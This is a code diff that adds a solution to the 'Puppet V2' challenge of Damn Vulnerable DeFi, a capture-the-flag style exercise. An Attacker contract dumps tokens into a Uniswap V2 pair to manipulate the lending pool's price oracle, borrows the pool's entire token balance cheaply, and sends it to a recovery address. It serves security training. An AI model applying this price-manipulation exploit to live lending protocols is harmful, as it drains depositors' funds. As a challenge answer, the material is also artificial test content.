@@ -10,6 +10,53 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
+contract Attacker is Test{
+    WETH weth;
+    DamnValuableToken token;
+    IUniswapV2Router02 uniswapV2Router;
+    PuppetV2Pool lendingPool;
+    address recovery;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+
+    constructor(
+        address payable _weth,
+        address _token,
+        address _uniswapV2Router,
+        address _lendingPool,
+        address _recovery
+    ) payable {
+        weth = WETH(_weth);
+        token = DamnValuableToken(_token);
+        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
+        lendingPool = PuppetV2Pool(_lendingPool);
+        recovery = _recovery;
+    }
+
+    function startAttack() external {
+        weth.deposit{value: address(this).balance}();
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            9e18,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+    function recieve() external payable {}
+}
+
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -98,7 +145,16 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker{value: 20e18}(
+            payable(address(weth)),
+            address(token),
+            address(uniswapV2Router),
+            address(lendingPool),
+            recovery
+        );
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        attacker.startAttack();
     }
 
     /**
